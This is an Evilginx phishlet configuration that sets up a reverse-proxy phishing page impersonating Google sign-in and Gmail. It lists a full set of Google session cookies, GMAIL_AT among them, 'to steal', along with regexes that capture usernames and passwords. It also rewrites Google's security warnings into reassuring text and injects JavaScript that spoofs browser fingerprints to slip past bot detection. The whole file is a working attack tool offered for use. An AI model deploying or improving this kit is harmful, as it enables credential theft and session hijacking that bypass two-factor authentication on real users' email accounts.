min_ver: '3.3.0'

# Gmail Phishlet - Improved Version
# Key improvements:
# 1. Added mail.google.com as a proxied domain to capture GMAIL_AT cookie
# 2. Added chat.google.com for complete session capture
# 3. Expanded auth_tokens to capture all Gmail-specific cookies
# 4. Added proper session flags for mail.google.com

# Subdomains that Evilginx will proxy
proxy_hosts:
  # Core authentication domains
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
  - {phish_sub: 'www3', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false}
  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: false, is_landing: false}
  
  # CRITICAL: Gmail inbox domain - required for GMAIL_AT cookie
  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  
  # Chat integration (sets COMPASS and OSID cookies)
  - {phish_sub: 'chat', orig_sub: 'chat', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  
  # Account management
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  
  # Static resources
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
  
  # Additional Google services
  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'youtube', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: false}
  
  # Image hosting (for Gmail profile pictures)
  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false, is_landing: false, auto_filter: false}

# Replace rules to avoid unwanted redirection
sub_filters:
  # Rewrite gstatic.com references to use our proxy
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://www.gstatic.com/_/mss/boq-identity/_/js/k=boq-identity.AccountsSignInUi.e', replace: 'https://accounts.{domain}/_/mss/boq-identity/_/js/k=boq-identity.AccountsSignInUi.e', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Generic hostname replacement
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Rewrite gstatic references
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'www.gstatic.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Hide browser detection errors
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'This browser or app may not be secure', replace: 'Please continue to sign in', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Couldn''t sign you in', replace: 'Sign in', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '"BROWSER_NOT_SUPPORTED"', replace: '"SUCCESS"', mimes: ['application/json']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '"UNSUPPORTED_BROWSER"', replace: '"SUCCESS"', mimes: ['application/json']}
  
  # Rewrite accounts.google.com references
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Rewrite mail.google.com references
  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: 'mail.google.com', replace: 'mail.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Rewrite chat.google.com references
  - {triggers_on: 'chat.google.com', orig_sub: 'chat', domain: 'google.com', search: 'chat.google.com', replace: 'chat.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Rewrite myaccount references
  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}

# Cookies to steal - EXPANDED for complete Gmail session
auth_tokens:
  # Primary Google authentication cookies (domain: .google.com)
  - domain: '.google.com'
    keys: 
      - 'SID'
      - 'HSID'
      - 'SSID'
      - 'APISID'
      - 'SAPISID'
      - 'NID'
      - 'SIDCC'
      - '__Secure-1PSID'
      - '__Secure-3PSID'
      - '__Secure-1PAPISID'
      - '__Secure-3PAPISID'
      - '__Secure-1PSIDCC'
      - '__Secure-3PSIDCC'
      - '__Secure-1PSIDTS'
      - '__Secure-3PSIDTS'
      - '__Secure-BUCKET'
      - '__Secure-STRP'
      - 'SEARCH_SAMESITE'
      - 'OGPC'
      - 'OGP'
      - '1P_JAR'
      - 'CONSENT'
      - 'AEC'
      - '.*,regexp'

  # accounts.google.com specific cookies
  - domain: 'accounts.google.com'
    keys:
      - 'GAPS'
      - 'LSID'
      - 'ACCOUNT_CHOOSER'
      - '__Host-GAPS'
      - '__Host-1PLSID'
      - '__Host-3PLSID'
      - 'SIDCC'
      - '__Secure-1PSIDCC'
      - '__Secure-3PSIDCC'
      - 'NID'
      - '.*,regexp'

  # CRITICAL: mail.google.com cookies for inbox access
  - domain: 'mail.google.com'
    keys:
      - 'GMAIL_AT'           # CRITICAL - Gmail action token
      - 'OSID'               # Session ID
      - '__Secure-OSID'      # Secure session ID
      - 'COMPASS'            # Gmail/Chat compass token
      - '__Host-GMAIL_SCH_GML'
      - '__Host-GMAIL_SCH_GMN'
      - '__Host-GMAIL_SCH_GMS'
      - 'SIDCC'
      - '__Secure-1PSIDCC'
      - '__Secure-3PSIDCC'
      - '.*,regexp'

  # chat.google.com cookies
  - domain: 'chat.google.com'
    keys:
      - 'OSID'
      - '__Secure-OSID'
      - 'COMPASS'
      - 'OTZ'
      - 'SIDCC'
      - '__Secure-1PSIDCC'
      - '__Secure-3PSIDCC'
      - '.*,regexp'

  # myaccount.google.com cookies
  - domain: 'myaccount.google.com'
    keys:
      - 'OSID'
      - '__Secure-OSID'
      - '.*,regexp'

# Capture username/password credentials
credentials:
  username:
    key: ''
    search: '\[\[\["MI613e","\[null,\\"(.*?)\\"'
    type: 'post'
  password:
    key: ''
    search: '\[1,\d,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
    type: 'post'
  custom:
    - key: 'f.req'
      search: '\["gf.siecp","([^"]*)"\]'
      type: 'post'
    - key: 'rapt'
      search: '"rapt":"([^"]*)'
      type: 'json'

# URLs that finalize authentication
auth_urls:
  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
  - '/CheckCookie'
  - '/ManageAccount'
  - '/RotateCookies'
  - '/mail/u/0'              # Gmail inbox - triggers GMAIL_AT
  - '/mail/u/0/'
  - '/'

# Legitimate site login page location
login:
  domain: 'accounts.google.com'
  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin&continue=https://mail.google.com/mail/u/0/'

# Injected JavaScript for redirection and anti-detection
js_inject:
  - trigger_domains: ['myaccount.google.com']
    trigger_paths: ['*']
    script: |
        window.addEventListener('load', () => {
          // Redirect root to 2FA settings for session validation
          if (window.location.pathname === '/') {
            window.location.href = '/u/4/signinoptions/twosv';
            return;
          }
          // Capture rapt token if present
          const urlParams = new URLSearchParams(window.location.search);
          if (urlParams.has('rapt')) {
            const raptValue = urlParams.get('rapt');
            fetch('/xxx', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({ rapt: raptValue })
            }).catch(error => console.error('Error:', error));
          }
        });
  
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['/signin*', '/v3/signin/identifier*', '/v3/signin/challenge*']
    script: |
        (function() {
          // Anti-bot detection: Comprehensive fingerprint spoofing
          
          // 1. Hide webdriver flag (primary detection)
          Object.defineProperty(navigator, 'webdriver', {
            get: () => false,
            configurable: true
          });
          
          // 2. Spoof plugins array (empty array indicates automation)
          Object.defineProperty(navigator, 'plugins', {
            get: () => {
              const plugins = [
                {name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer'},
                {name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai'},
                {name: 'Native Client', filename: 'internal-nacl-plugin'}
              ];
              plugins.length = 3;
              return plugins;
            },
            configurable: true
          });
          
          // 3. Spoof languages
          Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en'],
            configurable: true
          });
          
          // 4. Hide automation-related Chrome properties
          if (window.chrome) {
            window.chrome.runtime = window.chrome.runtime || {};
          }
          
          // 5. Spoof permissions API
          const originalQuery = navigator.permissions?.query;
          if (originalQuery) {
            navigator.permissions.query = (parameters) => {
              if (parameters.name === 'notifications') {
                return Promise.resolve({ state: 'prompt', onchange: null });
              }
              return originalQuery(parameters);
            };
          }
        })();

# Force POST parameters for proper flow - redirect to Gmail inbox
force_post:
  - path: '/v3/signin/_/AccountsSignInUi/data/batchexecute*'
    search:
      - {key: 'f.req', search: '.*'}
    force:
      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
    type: 'post'
  - path: '/v3/signin/challenge/pwd*'
    search:
      - {key: 'continue', search: '.*'}
    force:
      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
    type: 'post'
  - path: '/v3/signin/challenge/pwd/data/batchexecute*'
    search:
      - {key: 'f.req', search: '.*'}
    force:
      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
    type: 'post'